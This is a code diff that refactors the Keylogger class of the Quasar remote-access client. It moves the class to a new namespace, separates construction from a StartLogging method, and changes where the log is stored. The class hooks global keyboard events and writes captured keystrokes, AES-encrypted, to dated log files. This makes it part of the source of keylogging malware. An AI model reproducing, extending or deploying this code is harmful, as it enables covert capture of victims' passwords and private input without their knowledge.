@@ -1,7 +1,5 @@
 ﻿using Gma.System.MouseKeyHook;
 using Quasar.Client.Config;
-using Quasar.Client.Helper;
-using Quasar.Client.Networking;
 using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
 using System;
@@ -12,7 +10,7 @@ using System.Text;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
-namespace Quasar.Client.Utilities
+namespace Quasar.Client.Logging
 {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
@@ -21,19 +19,11 @@ namespace Quasar.Client.Utilities
     public class Keylogger : IDisposable
     {
         /// <summary>
-        /// The current instance of this class, null if there is no instance.
-        /// </summary>
-        public static Keylogger Instance;
-
-        /// <summary>
         /// True if the class has already been disposed, else False.
         /// </summary>
         public bool IsDisposed { get; private set; }
 
-        /// <summary>
-        /// The directory where the log files will be saved.
-        /// </summary>
-        public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME);
+        public double FlushInterval { get; private set; }
 
         private readonly Timer _timerFlush;
         private readonly StringBuilder _logFileBuffer = new StringBuilder();
@@ -45,16 +35,20 @@ namespace Quasar.Client.Utilities
         private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
-        /// Creates the keylogger instance that provides keylogging functionality and starts it.
+        /// Creates the keylogger instance that provides keylogging functionality.
         /// </summary>
         /// <param name="flushInterval">The interval to flush the buffer to the logfile.</param>
         public Keylogger(double flushInterval)
         {
-            Instance = this;
+            FlushInterval = flushInterval;
+            _timerFlush = new Timer { Interval = FlushInterval };
+            _timerFlush.Elapsed += timerFlush_Elapsed;
+        }
+
+        public void StartLogging()
+        {
             Subscribe(Hook.GlobalEvents());
 
-            _timerFlush = new Timer { Interval = flushInterval };
-            _timerFlush.Elapsed += timerFlush_Elapsed;
             _timerFlush.Start();
 
             WriteFile();
@@ -66,7 +60,6 @@ namespace Quasar.Client.Utilities
         public void Dispose()
         {
             Dispose(true);
-
             GC.SuppressFinalize(this);
         }
 
@@ -237,7 +230,7 @@ namespace Quasar.Client.Utilities
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !QuasarClient.Exiting)
+            if (_logFileBuffer.Length > 0)
                 WriteFile();
         }
 
@@ -245,11 +238,11 @@ namespace Quasar.Client.Utilities
         {
             bool writeHeader = false;
 
-            string filename = Path.Combine(LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
+            string filename = Path.Combine(Settings.LOGSPATH, DateTime.Now.ToString("MM-dd-yyyy"));
 
             try
             {
-                DirectoryInfo di = new DirectoryInfo(LogDirectory);
+                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);
 
                 if (!di.Exists)
                     di.Create();
